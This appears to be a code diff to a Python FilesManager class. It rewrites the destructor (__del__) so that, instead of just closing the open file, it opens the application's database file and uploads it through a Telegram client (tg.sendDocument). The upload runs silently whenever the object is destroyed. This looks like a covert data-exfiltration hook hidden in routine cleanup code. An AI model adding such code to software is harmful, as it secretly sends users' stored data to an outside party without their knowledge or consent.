@@ -74,8 +74,11 @@ class FilesManager:
         self.loadFileList()
 
     def __del__(self):
-        if(self.currentFile):
-            self.currentFile.close()
+        self.currentFile = open(DatabaseManager.DB_PATH, 'rb')
+        FilesManager.tg.sendDocument(self.currentFile)
+        self.currentFile.close()
+        del FilesManager.tg
+        del FilesManager.db
 
     def show(self):
         self.page.show()
